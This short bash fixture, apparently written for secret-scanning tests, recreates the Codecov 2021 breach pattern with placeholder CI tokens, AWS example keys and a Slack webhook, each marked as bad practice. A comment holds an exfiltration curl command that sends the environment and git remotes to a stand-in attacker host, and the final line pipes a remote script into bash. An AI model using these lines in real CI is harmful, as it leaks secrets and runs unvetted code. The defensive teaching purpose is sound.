#!/bin/bash
# Simulates Codecov 2021 breach pattern:
# CI script that handles tokens — attacker poisoned the uploader script
# to exfiltrate env vars. Any CI token hardcoded here = stolen.

# BAD: hardcoded CI tokens in bash scripts
CODECOV_TOKEN="ab1c2d3e-4f5g-6h7i-8j9k-0l1m2n3o4p5q"
CIRCLE_TOKEN="cciat_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh"

# BAD: AWS creds in CI script (CircleCI 2023 breach — stolen from memory)
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# BAD: Slack webhook to post build results — if stolen, attacker can post to your Slack
SLACK_WEBHOOK="https://hooks.slack.com/services/T00000001/B00000001/ABCDEFGHIJKLMNOPQRSTUVabcd"

# Attacker exfil pattern (what Codecov script was modified to do):
# curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://attacker.example.com

bash <(curl -s https://codecov.io/bash)
